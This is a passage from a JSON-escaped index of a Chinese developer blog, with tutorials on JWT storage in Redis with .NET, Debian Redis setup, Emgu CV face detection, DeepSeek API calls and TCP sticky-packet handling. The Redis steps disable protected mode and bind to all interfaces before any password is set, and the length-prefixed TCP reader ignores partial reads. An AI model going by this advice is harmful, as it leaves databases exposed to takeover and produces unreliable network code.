valid\u0026#34;); } 4. Token 失效机制 利用 Redis 的 TTL 设置 token 的自动过期：\n在存储 token 时设置过期时间。 用户注销时可以手动删除 Redis 中的 token。 注销示例：\n[HttpPost(\u0026#34;logout\u0026#34;)] public IActionResult Logout() { var username = User.Identity?.Name; var db = _redis.GetDatabase(); db.KeyDelete($\u0026#34;jwt:{username}\u0026#34;); return Ok(\u0026#34;Logged out\u0026#34;); } 总结 通过 Redis 存储 JWT，可以实现以下功能：\n集中管理 JWT：便于实时撤销或查询。 自动过期：Redis 自带 TTL，可以简化 token 的管理。 扩展性好：适用于分布式系统。 根据实际需求，还可以扩展功能，例如黑名单机制或支持多设备登录等。\ndebian redis setup 1: 更新软件包列表 首先，确保的软件包列表是最新的。打开终端并执行以下命令：\nsudo apt update 2: 安装Redis 更新完软件包列表后，可以通过apt包管理器来安装Redis服务器：\nsudo apt install redis-server 这将安装Redis及其依赖项，并自动启动Redis服务。\n3: 检查Redis状态 安装完成后，可以检查Redis服务是否正在运行：\nsudo systemctl status redis-server 如果服务正在运行，会看到类似“active (running)”的状态信息。\n4: 配置Redis Redis的配置文件位于/etc/redis/redis.conf。可能想要编辑这个文件来更改默认设置，例如绑定地址、端口号、要求密码等。使用文本编辑器打开它：\nsudo nano /etc/redis/redis.conf 做出必要的更改后保存文件并退出编辑器。\n5: 重启Redis服务 如果对配置文件做了任何修改，记得重启Redis服务以使更改生效：\nsudo systemctl restart redis-server 6: 设置Redis开机自启 为了确保Redis在系统启动时自动启动，可以使用以下命令启用开机自启：\nsudo systemctl enable redis-server 7: 测试Redis安装 可以通过连接到本地Redis服务器来测试安装是否成功。使用redis-cli命令行工具连接到Redis：\nredis-cli 一旦进入Redis CLI，可以尝试运行ping命令，如果Redis服务器响应PONG，则说明安装和配置都正常工作。\n127.0.0.1:6379\u0026gt; ping PONG Redis 配置文件 编辑 Redis 的配置文件（通常是 /etc/redis/redis.conf）。\n确保允许远程连接：\nbind 0.0.0.0 （默认仅允许本地连接，127.0.0.1）。 确保未设置 protected-mode 为 yes，或者明确配置授权规则：\nprotected-mode no 重启 Redis 服务以应用更改：\nsudo systemctl restart redis err 500 Undocumented Error: Internal Server Error Response body System.InvalidOperationException: Multiple constructors accepting all given argument types have been found in type \u0026lsquo;userApiController\u0026rsquo;. There should only be one applicable constructor. at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.TryFindMatchingConstructor(Type instanceType, Type[] argumentTypes, ConstructorInfo\u0026amp; matchingConstructor, Nullable1[]\u0026amp; parameterMap) at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.FindApplicableConstructor(Type instanceType, Type[] argumentTypes, ConstructorInfo\u0026amp; matchingConstructor, Nullable1[]\u0026amp; matchingParameterMap) at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.CreateFactoryInternal(Type instanceType, Type[] argumentTypes, ParameterExpression\u0026amp; provider, ParameterExpression\u0026amp; argumentArray, Expression\u0026amp; factoryExpressionBody)\n问题是由于依赖注入系统在实例化 userApiController 时发现有多个构造函数可以匹配传递的参数，因此无法确定使用哪个构造函数。这种情况会导致 System.InvalidOperationException 异常。多个改成一个。\nSystem.InvalidOperationException: 、 Unable to resolve service for type \u0026lsquo;JwtHelper\u0026rsquo; while attempting to activate \u0026lsquo;userApiController\u0026rsquo;. at Microsoft.Extensions.DependencyInjection.ActivatorUtilities.ThrowHelperUnableToResolveService(Type type, Type requiredBy) at lambda_method69(Closure, IServiceProvider, Object[])\n这个错误表明 wtHelper 类型未在依赖注入 (DI) 容器中注册，而 IM.Controllers.userApiController 需要它作为依赖。DI 系统在尝试解析 JwtHelper 时失败，导致 Internal Server Error。\n检查依赖注册 确保在 Program.cs 或 Startup.cs 文件中注册了 JwtHelper 服务。如果 JwtHelper 是一个自定义工具类或服务，你需要将它添加到 DI 容器中。\nbuilder.Services.AddScoped(); 如果 JwtHelper 需要构造函数注入的依赖项，也要确保这些依赖已注册。 如果 JwtHelper 是无状态的，考虑使用 AddSingleton。\nStackExchange.Redis.RedisConnectionException: “It was not possible to connect to the redis server(s). Error connecting right now. To allow this multiplexer to continue retrying until it\u0026rsquo;s able to connect, use abortConnect=false in your connection string or AbortOnConnectFail=false; in your code.”\n检查 Redis 的配置文件（通常是 /etc/redis/redis.conf）。 确保允许远程连接： bind 0.0.0.0 .Connect(\u0026ldquo;XXXX:6379,abortConnect=false\u0026rdquo;));\n重启redis\nRedis 保护模式 Redis 处于保护模式，默认情况下禁止外部连接。\n解决方法： 修改 redis.conf 中的 protected-mode 设置：\nprotected-mode no 重启 Redis：\nsudo systemctl restart redis 程序测试redis .NET\n// Redis 服务器地址和端口 string redisConnectionString = \u0026#34;199.24x.x.x:6379\u0026#34;; // 默认 Redis 端口是 6379 // 创建连接到 Redis 的实例 ConnectionMultiplexer redis = null; try { redis = ConnectionMultiplexer.Connect(redisConnectionString); Console.WriteLine(\u0026#34;连接成功!\u0026#34;); } catch (Exception ex) { Console.WriteLine($\u0026#34;连接到 Redis 失败: {ex.Message}\u0026#34;); return; } // 获取 Redis 数据库实例 IDatabase db = redis.GetDatabase(); // 写入数据 string key = \u0026#34;myKey22\u0026#34;; string value = \u0026#34;Hello, Redis!\u0026#34;; db.StringSet(key, value); Console.WriteLine($\u0026#34;已写入: {key} - {value}\u0026#34;); // 读取数据 string retrievedValue = db.StringGet(key); Console.WriteLine($\u0026#34;读取到: {key} - {retrievedValue}\u0026#34;); // 删除数据 db.KeyDelete(key); Console.WriteLine($\u0026#34;已删除: {key}\u0026#34;); // 关闭连接 redis.Close(); Console.WriteLine(\u0026#34;连接关闭\u0026#34;); node\nnpm i redis const redis = require(\u0026#39;redis\u0026#39;); // 创建Redis客户端连接 const client = redis.createClient({ host: \u0026#39;199.24x.x.x\u0026#39;, port: 6379 }); // 监听连接事件，当成功连接到Redis时执行回调函数 client.on(\u0026#39;connect\u0026#39;, () =\u0026gt; { console.log(\u0026#39;成功连接到Redis服务器\u0026#39;); }); // 监听错误事件，当出现错误时执行回调函数 client.on(\u0026#39;error\u0026#39;, (err) =\u0026gt; { console.log(\u0026#39;连接Redis服务器时出现错误：\u0026#39;, err); }); // 设置一个键值对 client.set(\u0026#39;myKey\u0026#39;, \u0026#39;myValue\u0026#39;, (err, reply) =\u0026gt; { if (err) { console.log(\u0026#39;设置键值对时出现错误：\u0026#39;, err); } else { console.log(\u0026#39;设置键值对成功，回复：\u0026#39;, reply); } }); // 获取键值对 client.get(\u0026#39;myKey\u0026#39;, (err, value) =\u0026gt; { if (err) { console.log(\u0026#39;获取键值对时出现错误：\u0026#39;, err); } else { console.log(\u0026#39;获取到的键值对的值为：\u0026#39;, value); } }); // 删除键值对 client.del(\u0026#39;myKey\u0026#39;, (err, reply) =\u0026gt; { if (err) { console.log(\u0026#39;删除键值对时出现错误：\u0026#39;, err); } else { console.log(\u0026#39;删除键值对成功，回复：\u0026#39;, reply); } }); // 关闭Redis客户端连接 client.quit(); return; redis设置密码 1. 编辑 Redis 配置文件 Redis 的配置文件通常位于 /etc/redis/redis.conf 或 /etc/redis.conf。用你喜欢的文本编辑器打开它，例如：\nsudo nano /etc/redis/redis.conf 2. 找到并修改 requirepass 参数 在配置文件中找到以下行（可能被注释掉）：\n# requirepass foobared 将其取消注释并替换为你的密码，例如：\nrequirepass your_secure_password 3. 重启 Redis 服务 保存并退出文件后，重启 Redis 服务以应用更改：\nsudo systemctl restart redis 4. 测试密码功能 你可以通过以下命令测试 Redis 是否需要密码：\n使用 redis-cli 连接 尝试未输入密码的命令：\nredis-cli \u0026gt; get key 如果设置了密码，Redis 会返回类似如下的错误：\n(error) NOAUTH Authentication required. 使用 AUTH 命令验证：\nredis-cli \u0026gt; auth your_secure_password OK \u0026gt; get key 如果密码正确，后续操作将生效。\n5. 链接修改 199.x.x.xxx:6379,password=123X.zx 更改redis链接\nredis缓存json RedisHelper 方法添加 Redis 缓存，可以通过以下方式扩展代码：\n实现思路 定义 Redis 缓存逻辑：\n先尝试从 Redis 缓存中读取数据。 如果缓存命中，则直接返回数据。 如果缓存未命中，则查询数据库，处理数据后存入 Redis，并设置适当的过期时间。 定义 Redis 键：\n使用一个唯一键，例如 CityInfoList:{id}，确保缓存区分不同 id 的数据。 序列化和反序列化：\n使用 JSON 格式存储数据，方便跨语言和跨系统的兼容性。 扩展后的代码 以下是添加 Redis 缓存后的完整实现：\npublic List\u0026lt;CityInfoS\u0026gt; FindIMCityInfoListByPIDS(string id) { // 定义 Redis 缓存键 string redisKey = $\u0026#34;IMCityInfoList:{id}\u0026#34;; // 尝试从 Redis 获取数据 string cachedData = RedisHelper.GetString(redisKey); // RedisHelper 是 Redis 操作工具类 if (!string.IsNullOrEmpty(cachedData)) { // 如果缓存命中，反序列化并返回数据 return JsonConvert.DeserializeObject\u0026lt;List\u0026lt;IMCityInfoS\u0026gt;\u0026gt;(cachedData); } // 缓存未命中，从数据库查询 string sql = @\u0026#34;SELECT `CtId`, `Pid`, `PidS`, `CityCode`, `CityName`, `PostCode`, `AreaCode`, `Ctime`, `CtimeInt`, `LangType`, `HasSon` FROM `IMCityInfoS` WHERE PID = @PID\u0026#34;; var parameters = new MySqlParameter[] { new MySqlParameter(\u0026#34;@PID\u0026#34;, id) }; DataSet ds = DbHelperMySQL.Query(sql, parameters); if (ds != null \u0026amp;\u0026amp; ds.Tables[0].Rows.Count \u0026gt; 0) { // 转换查询结果为 JSON string json = JsonConvert.SerializeObject(ds.Tables[0]); // 设置缓存并指定过期时间（例如30分钟） RedisHelper.SetString(redisKey, json, TimeSpan.FromMinutes(30)); // 反序列化为对象列表并返回 return JsonConvert.DeserializeObject\u0026lt;List\u0026lt;IMCityInfoS\u0026gt;\u0026gt;(json); } // 如果查询无结果，返回空 return null; } RedisHelper 工具类 如果你尚未实现 RedisHelper，可以参考以下示例代码：\nusing StackExchange.Redis; using System; public static class RedisHelper { private static readonly ConnectionMultiplexer redis = ConnectionMultiplexer.Connect(\u0026#34;localhost\u0026#34;); // 替换为你的 Redis 地址 private static readonly IDatabase db = redis.GetDatabase(); // 获取字符串数据 public static string GetString(string key) { return db.StringGet(key); } // 设置字符串数据并指定过期时间 public static void SetString(string key, string value, TimeSpan? expiry = null) { db.StringSet(key, value, expiry); } } 使用注意事项 Redis 连接池：实际生产中，建议使用 Redis 连接池来管理连接，避免连接过多导致资源占用。 异常处理：在 Redis 读写操作中，添加异常捕获逻辑，确保即使 Redis 出现问题，也不会影响数据库查询。 过期时间：根据业务需求设置合理的过期时间，避免缓存数据过期或无效。\n","permalink":"https://qfsyso.github.io/posts/jwt-redis/","summary":"Redis JWT 在 .NET 中使用 Redis 来存储 JWT（JSON Web Token）可以通过多种方式实现， 例如在用户登录时将生成的 JWT 存储在 Redis 中以便于后续验证和管理。\n实现步骤\n引入依赖 确保你的项目引入了以下必要的 NuGet 包：\nMicrosoft.AspNetCore.Authentication.JwtBearer：用于 JWT 身份验证。 StackExchange.Redis：用于与 Redis 通信。\ndotnet add package Microsoft.AspNetCore.Authentication.JwtBearer dotnet add package StackExchange.Redis 配置 Redis 客户端 设置 Redis 的连接和操作。\n生成 JWT 根据用户信息生成 JWT 并将其存储到 Redis。\n验证 JWT 在验证阶段从 Redis 检查 token 是否有效。\n实现 Token 的失效机制 利用 Redis 的 TTL（过期时间）特性来管理 token 的生命周期。\n代码实现 1. 配置 Redis 客户端 在 Program.cs 或 Startup.","title":"jwt redis"},{"content":"Emgu CV进行基本的人脸检测。 人脸检测是指定位图像中的人脸位置，而人脸识别是指确认或验证这些脸孔的身份。为了实现人脸识别，需要训练一个模型，或者使用预训练的模型。\n安装 Emgu CV 首先，需要通过NuGet安装Emgu CV包。可以通过Visual Studio的NuGet包管理器来安装：\n打开的C#项目。 右键点击解决方案资源管理器中的项目名称，选择“管理NuGet程序包”。\n搜索并安装Emgu.CV和Emgu.CV.runtime.windows。 // 加载人脸检测分类器 CascadeClassifier faceCascade = new CascadeClassifier(\u0026#34;haarcascade_frontalface_default.xml\u0026#34;); // 读取输入图像 Image\u0026lt;Bgr, byte\u0026gt; inputImage = new Image\u0026lt;Bgr, byte\u0026gt;(\u0026#34;face.jpg\u0026#34;); // 转换为灰度图像，因为人脸检测通常在灰度图像上进行 Image\u0026lt;Gray, byte\u0026gt; grayImage = inputImage.Convert\u0026lt;Gray, byte\u0026gt;(); // 进行人脸检测 Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty); // 在检测到的人脸周围绘制矩形框 foreach (Rectangle face in faces) { inputImage.Draw(face, new Bgr(0, 255, 0), 3); } // 保存标记后的图像为output.jpg inputImage.Save(\u0026#34;output.jpg\u0026#34;); Console.WriteLine(\u0026#34;save~output.jpg\u0026#34;); xml来自 https://github.com/opencv/opencv/tree/master/data/haarcascades\nruntime 如果没有 Emgu.CV.runtime.windows 则会加载不了xml\nException ：System.TypeInitializationException:“The type initializer for \u0026lsquo;Emgu.CV.CvInvoke\u0026rsquo; threw an exception.”\n检查运行时依赖 (opencv_world*.dll) 是否加载正确。 安装最新的 VC++ Redistributable。 确保项目目标平台与 Emgu.CV 的依赖项一致。\n识别猫脸 // 加载检测分类器 CascadeClassifier faceCascade = new CascadeClassifier(\u0026#34;haarcascade_frontalcatface.xml\u0026#34;); // 读取输入图像 Image\u0026lt;Bgr, byte\u0026gt; inputImage = new Image\u0026lt;Bgr, byte\u0026gt;(\u0026#34;cat2.jpg\u0026#34;); // 转换为灰度图像，因为人脸检测通常在灰度图像上进行 Image\u0026lt;Gray, byte\u0026gt; grayImage = inputImage.Convert\u0026lt;Gray, byte\u0026gt;(); // 进行人脸检测 Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty); // 在检测到的人脸周围绘制矩形框 foreach (Rectangle face in faces) { inputImage.Draw(face, new Bgr(0, 255, 0), 3); } // 保存标记后的图像为output.jpg inputImage.Save(\u0026#34;output.jpg\u0026#34;); Console.WriteLine(\u0026#34;save~output.jpg\u0026#34;); ","permalink":"https://qfsyso.github.io/posts/cashrp-opencv/","summary":"Emgu CV进行基本的人脸检测。 人脸检测是指定位图像中的人脸位置，而人脸识别是指确认或验证这些脸孔的身份。为了实现人脸识别，需要训练一个模型，或者使用预训练的模型。\n安装 Emgu CV 首先，需要通过NuGet安装Emgu CV包。可以通过Visual Studio的NuGet包管理器来安装：\n打开的C#项目。 右键点击解决方案资源管理器中的项目名称，选择“管理NuGet程序包”。\n搜索并安装Emgu.CV和Emgu.CV.runtime.windows。 // 加载人脸检测分类器 CascadeClassifier faceCascade = new CascadeClassifier(\u0026#34;haarcascade_frontalface_default.xml\u0026#34;); // 读取输入图像 Image\u0026lt;Bgr, byte\u0026gt; inputImage = new Image\u0026lt;Bgr, byte\u0026gt;(\u0026#34;face.jpg\u0026#34;); // 转换为灰度图像，因为人脸检测通常在灰度图像上进行 Image\u0026lt;Gray, byte\u0026gt; grayImage = inputImage.Convert\u0026lt;Gray, byte\u0026gt;(); // 进行人脸检测 Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, 1.1, 3, Size.Empty); // 在检测到的人脸周围绘制矩形框 foreach (Rectangle face in faces) { inputImage.Draw(face, new Bgr(0, 255, 0), 3); } // 保存标记后的图像为output.jpg inputImage.Save(\u0026#34;output.jpg\u0026#34;); Console.WriteLine(\u0026#34;save~output.jpg\u0026#34;); xml来自 https://github.com/opencv/opencv/tree/master/data/haarcascades\nruntime 如果没有 Emgu.CV.runtime.windows 则会加载不了xml","title":"cashrp opencv"},{"content":"DeepSeek-V2.5 在目前大模型主流榜单中，DeepSeek-V2.5 均表现出色\n中文综合能力（AlignBench）位列开源榜首 与 GPT-4-Turbo，文心 4.0 等闭源模型在评测中处于同一梯队\n英文综合能力（MT-Bench）处于第一梯队 英文综合能力（MT-Bench）与最强的开源模型 LLaMA3-70B 处于同一梯队，超过最强 MoE 开源模型 Mixtral8x22B\n知识、数学、推理、编程等榜单结果位居前列 开源模型支持 128K 上下文\napi curl https://api.deepseek.com/chat/completions \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -H \u0026#34;Authorization: Bearer xx\u0026#34; \\ -d \u0026#39;{ \u0026#34;model\u0026#34;: \u0026#34;deepseek-chat\u0026#34;, \u0026#34;messages\u0026#34;: [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Hello!\u0026#34;} ], \u0026#34;stream\u0026#34;: false }\u0026#39; py # Please install OpenAI SDK first: `pip3 install openai` from openai import OpenAI client = OpenAI(api_key=\u0026#34;skx\u0026#34;, base_url=\u0026#34;https://api.deepseek.com\u0026#34;) response = client.chat.completions.create( model=\u0026#34;deepseek-chat\u0026#34;, messages=[ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;你好，你是什么大模型？你能做什么？\u0026#34;}, ], stream=False ) print(response.choices[0].message.content) node // Please install OpenAI SDK first: `npm install openai` import OpenAI from \u0026#34;openai\u0026#34;; const openai = new OpenAI({ baseURL: \u0026#39;https://api.deepseek.com\u0026#39;, apiKey: \u0026#39;xx\u0026#39; }); async function main() { const completion = await openai.chat.completions.create({ messages: [{ role: \u0026#34;system\u0026#34;, content: \u0026#34;You are a helpful assistant.\u0026#34; }], model: \u0026#34;deepseek-chat\u0026#34;, }); console.log(completion.choices[0].message.content); } main(); 得到回答:\n你好！我是一个基于人工智能技术的大型语言模型，由深度求索（DeepSeek）公司开发。我的核心功能是通过大量文本数据训练，能够理解和生成自然语言，从而协助用户解答问题、提供信息、进行对话等。 我能做的事情包括但不限于： 1. **回答问题**：无论是科学知识、历史事件、文化常识还是日常生活中的疑问，我都可以尽力提供准确的信息。 2. **提供建议**：在某些情况下，我可以根据你的需求提供一些建议或指导。 3. **语言翻译**：虽然我的主要语言是中文，但我也可以理解和生成其他语言的文本，帮助进行简单的翻译工作。 4. **文本创作**：我可以协助撰写文章、故事、报告等文本内容，提供创意和写作支持。 5. **学习辅导**：在教育领域，我可以提供一些基础的学习辅导，帮助理解复杂的概念。 请注意，虽然我尽力提供准确和有用的信息，但我也有局限性，尤其是在处理非常专业或最新的信息时。我的知识截止日期是2023年，因此对于之后发生的事件或发展的信息可能不准确或不完整。 Temperature 设置 temperature 参数默认为 1.0。\n场景\t温度 代码生成/数学解题 0.0 数据抽取/分析\t1.0 通用对话\t1.3 翻译\t1.3 创意类写作/诗歌创作\t1.5\ntoken 和字数的换算比 1 个英文字符 ≈ 0.3 个 token。 1 个中文字符 ≈ 0.6 个 token。\n错误码\t描述 400 - 格式错误\t原因：请求体格式错误 解决方法：请根据错误信息提示修改请求体 401 - 认证失败\t原因：API key 错误，认证失败 解决方法：请检查您的 API key 是否正确，如没有 API key，请先 创建 API key 402 - 余额不足\t原因：账号余额不足 解决方法：请确认账户余额，并前往 充值 页面进行充值 422 - 参数错误\t原因：请求体参数错误 解决方法：请根据错误信息提示修改相关参数 429 - 请求速率达到上限\t原因：请求速率（TPM 或 RPM）达到上限 解决方法：请合理规划您的请求速率。 500 - 服务器故障\t原因：服务器内部故障 解决方法：请等待后重试。若问题一直存在，请联系我们解决 503 - 服务器繁忙\t原因：服务器负载过高 解决方法：请稍后重试您的请求\nJSON Output 在很多场景下，用户需要让模型严格按照 JSON 格式来输出，以实现输出的结构化，便于后续逻辑进行解析。\nDeepSeek 提供了 JSON Output 功能，来确保模型输出合法的 JSON 字符串。\n注意事项 设置 response_format 参数为 {\u0026rsquo;type\u0026rsquo;: \u0026lsquo;json_object\u0026rsquo;}。 用户传入的 system 或 user prompt 中必须含有 json 字样，并给出希望模型输出的 JSON 格式的样例，以指导模型来输出合法 JSON。 需要合理设置 max_tokens 参数，防止 JSON 字符串被中途截断。\nimport json from openai import OpenAI client = OpenAI( api_key=\u0026#34;\u0026lt;your api key\u0026gt;\u0026#34;, base_url=\u0026#34;https://api.deepseek.com\u0026#34;, ) system_prompt = \u0026#34;\u0026#34;\u0026#34; The user will provide some exam text. Please parse the \u0026#34;question\u0026#34; and \u0026#34;answer\u0026#34; and output them in JSON format. EXAMPLE INPUT: Which is the highest mountain in the world? Mount Everest. EXAMPLE JSON OUTPUT: { \u0026#34;question\u0026#34;: \u0026#34;Which is the highest mountain in the world?\u0026#34;, \u0026#34;answer\u0026#34;: \u0026#34;Mount Everest\u0026#34; } \u0026#34;\u0026#34;\u0026#34; user_prompt = \u0026#34;Which is the longest river in the world? The Nile River.\u0026#34; messages = [{\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: system_prompt}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: user_prompt}] response = client.chat.completions.create( model=\u0026#34;deepseek-chat\u0026#34;, messages=messages, response_format={ \u0026#39;type\u0026#39;: \u0026#39;json_object\u0026#39; } ) print(json.loads(response.choices[0].message.content)) 模型将会输出：\n{ \u0026#34;question\u0026#34;: \u0026#34;Which is the longest river in the world?\u0026#34;, \u0026#34;answer\u0026#34;: \u0026#34;The Nile River\u0026#34; } Function Calling Function Calling 让模型能够调用外部工具，来增强自身能力。\n获取用户当前位置的天气信息为例，展示了使用 Function Calling 的完整 Python 代码。\nFunction Calling 的具体 API 格式请参考对话补全文档。\nfrom openai import OpenAI def send_messages(messages): response = client.chat.completions.create( model=\u0026#34;deepseek-chat\u0026#34;, messages=messages, tools=tools ) return response.choices[0].message client = OpenAI( api_key=\u0026#34;\u0026lt;your api key\u0026gt;\u0026#34;, base_url=\u0026#34;https://api.deepseek.com\u0026#34;, ) tools = [ { \u0026#34;type\u0026#34;: \u0026#34;function\u0026#34;, \u0026#34;function\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;get_weather\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;Get weather of an location, the user shoud supply a location first\u0026#34;, \u0026#34;parameters\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;object\u0026#34;, \u0026#34;properties\u0026#34;: { \u0026#34;location\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;string\u0026#34;, \u0026#34;description\u0026#34;: \u0026#34;The city and state, e.g. San Francisco, CA\u0026#34;, } }, \u0026#34;required\u0026#34;: [\u0026#34;location\u0026#34;] }, } }, ] messages = [{\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;How\u0026#39;s the weather in Hangzhou?\u0026#34;}] message = send_messages(messages) print(f\u0026#34;User\u0026gt;\\t {messages[0][\u0026#39;content\u0026#39;]}\u0026#34;) tool = message.tool_calls[0] messages.append(message) messages.append({\u0026#34;role\u0026#34;: \u0026#34;tool\u0026#34;, \u0026#34;tool_call_id\u0026#34;: tool.id, \u0026#34;content\u0026#34;: \u0026#34;24℃\u0026#34;}) message = send_messages(messages) print(f\u0026#34;Model\u0026gt;\\t {message.content}\u0026#34;) 这个例子的执行流程如下：\n用户：询问现在的天气 模型：返回 function get_weather({location: \u0026lsquo;Hangzhou\u0026rsquo;}) 用户：调用 function get_weather({location: \u0026lsquo;Hangzhou\u0026rsquo;})，并传给模型。 模型：返回自然语言，\u0026ldquo;The current temperature in Hangzhou is 24°C.\u0026rdquo; 注：上述代码中 get_weather 函数功能需由用户提供，模型本身不执行具体函数。\n此外还有上下文，缓存等\n能做什么？ 提示库 探索 DeepSeek 提示词样例，挖掘更多可能\n代码改写 对代码进行修改，来实现纠错、注释、调优等。\n代码解释 对代码进行解释，来帮助理解代码内容。\n代码生成 让模型生成一段完成特定功能的代码。\n内容分类 对文本内容进行分析，并对齐进行自动归类\n结构化输出 将内容转化为 Json，来方便后续程序处理\n角色扮演（自定义人设） 自定义人设，来与用户进行角色扮演。\n角色扮演（情景续写） 提供一个场景，让模型模拟该场景下的任务对话\n散文写作 让模型根据提示词创作散文\n诗歌创作 让模型根据提示词，创作诗歌\n文案大纲生成 根据用户提供的主题，来生成文案大纲\n宣传标语生成 让模型生成贴合商品信息的宣传标语。\n模型提示词生成 根据用户需求，帮助生成高质量提示词\n中英翻译专家 中英文互译，对用户输入内容进行翻译\n还有 ，做图表，翻译助手，软件工程师，夸夸机，起名先生，命理大师，学英语，Midjourney Prompt，DBA，格言警句，文字排版，小红书文案标题，爆款文案，面试模拟，Slogan生成，长文总结，私人健身教练，论文润色 等等\n","permalink":"https://qfsyso.github.io/posts/deepseek-v2.5/","summary":"DeepSeek-V2.5 在目前大模型主流榜单中，DeepSeek-V2.5 均表现出色\n中文综合能力（AlignBench）位列开源榜首 与 GPT-4-Turbo，文心 4.0 等闭源模型在评测中处于同一梯队\n英文综合能力（MT-Bench）处于第一梯队 英文综合能力（MT-Bench）与最强的开源模型 LLaMA3-70B 处于同一梯队，超过最强 MoE 开源模型 Mixtral8x22B\n知识、数学、推理、编程等榜单结果位居前列 开源模型支持 128K 上下文\napi curl https://api.deepseek.com/chat/completions \\ -H \u0026#34;Content-Type: application/json\u0026#34; \\ -H \u0026#34;Authorization: Bearer xx\u0026#34; \\ -d \u0026#39;{ \u0026#34;model\u0026#34;: \u0026#34;deepseek-chat\u0026#34;, \u0026#34;messages\u0026#34;: [ {\u0026#34;role\u0026#34;: \u0026#34;system\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;You are a helpful assistant.\u0026#34;}, {\u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;, \u0026#34;content\u0026#34;: \u0026#34;Hello!\u0026#34;} ], \u0026#34;stream\u0026#34;: false }\u0026#39; py # Please install OpenAI SDK first: `pip3 install openai` from openai import OpenAI client = OpenAI(api_key=\u0026#34;skx\u0026#34;, base_url=\u0026#34;https://api.","title":" DeepSeek-V2.5"},{"content":"模拟粘包的场景 粘包通常在发送端因数据频繁写入缓冲区并一起发送，或者在接收端没有明确的分包逻辑导致读取不完整的数据包时发生。\n使用固定分隔符或包头+包体 常见的解决粘包方案是使用分隔符（如 \\n 或特殊字符），或采用固定的包头标识数据长度。\n服务端代码\nusing System; using System.Net; using System.Net.Sockets; using System.Text; using System.Threading; class TcpServer { static void Main() { TcpListener listener = new TcpListener(IPAddress.Any, 5000); listener.Start(); Console.WriteLine(\u0026#34;Server started, waiting for connection...\u0026#34;); Socket clientSocket = listener.AcceptSocket(); Console.WriteLine(\u0026#34;Client connected!\u0026#34;); byte[] buffer = new byte[1024]; int bytesRead; while ((bytesRead = clientSocket.Receive(buffer)) \u0026gt; 0) { string receivedData = Encoding.UTF8.GetString(buffer, 0, bytesRead); Console.WriteLine($\u0026#34;Received: {receivedData}\u0026#34;); // 模拟数据未分包的场景 Console.WriteLine(\u0026#34;Processing received data...\u0026#34;); string[] messages = receivedData.Split(\u0026#39;|\u0026#39;); foreach (var message in messages) { if (!string.IsNullOrEmpty(message)) { Console.WriteLine($\u0026#34;Processed: {message}\u0026#34;); } } } clientSocket.Close(); listener.Stop(); } } 客户端代码\nusing System; using System.Net.Sockets; using System.Text; class TcpClientDemo { static void Main() { TcpClient client = new TcpClient(\u0026#34;127.0.0.1\u0026#34;, 5000); Console.WriteLine(\u0026#34;Connected to server.\u0026#34;); NetworkStream stream = client.GetStream(); // 模拟粘包场景：连续发送多个小数据包 string[] messages = { \u0026#34;Message1\u0026#34;, \u0026#34;Message2\u0026#34;, \u0026#34;Message3\u0026#34; }; foreach (var message in messages) { string data = message + \u0026#34;|\u0026#34;; byte[] buffer = Encoding.UTF8.GetBytes(data); stream.Write(buffer, 0, buffer.Length); Console.WriteLine($\u0026#34;Sent: {message}\u0026#34;); } stream.Close(); client.Close(); } } 分析代码中的粘包场景 客户端 模拟粘包通过连续发送数据包（Message1|Message2|Message3|），未等待服务端处理后再发送下一个包。\n服务端 接收数据时，数据可能一次性接收到多个数据包，也可能接收到不完整的数据包。通过使用分隔符 | 拆分数据，可以解决粘包问题。\n扩展：更高效的分包方式（包头+包体） 数据格式 包头：4 字节，表示包体长度。 包体：实际数据内容。\n处理粘包问题 服务端\nwhile (true) { int headerSize = 4; byte[] headerBuffer = new byte[headerSize]; // 读取包头 int headerBytes = clientSocket.Receive(headerBuffer); if (headerBytes \u0026lt; headerSize) break; // 连接断开 int bodyLength = BitConverter.ToInt32(headerBuffer, 0); byte[] bodyBuffer = new byte[bodyLength]; // 读取包体 int bodyBytes = clientSocket.Receive(bodyBuffer); string message = Encoding.UTF8.GetString(bodyBuffer, 0, bodyBytes); Console.WriteLine($\u0026#34;Received Message: {message}\u0026#34;); } 客户端代码（包头 + 包体）\nusing System; using System.Net.Sockets; using System.Text; class TcpClientDemo { static void Main() { TcpClient client = new TcpClient(\u0026#34;127.0.0.1\u0026#34;, 5000); Console.WriteLine(\u0026#34;Connected to server.\u0026#34;); NetworkStream stream = client.GetStream(); // 模拟发送多条消息 string[] messages = { \u0026#34;Hello, Server!\u0026#34;, \u0026#34;This is a test.\u0026#34;, \u0026#34;Goodbye!\u0026#34; }; foreach (var message in messages) { // 将消息转为字节数组 byte[] bodyBuffer = Encoding.UTF8.GetBytes(message); // 包头：消息长度（4 字节整数） byte[] headerBuffer = BitConverter.GetBytes(bodyBuffer.Length); // 组合包头和包体 byte[] packet = new byte[headerBuffer.Length + bodyBuffer.Length]; Buffer.BlockCopy(headerBuffer, 0, packet, 0, headerBuffer.Length); Buffer.BlockCopy(bodyBuffer, 0, packet, headerBuffer.Length, bodyBuffer.Length); // 发送数据包 stream.Write(packet, 0, packet.Length); Console.WriteLine($\u0026#34;Sent: {message}\u0026#34;); } 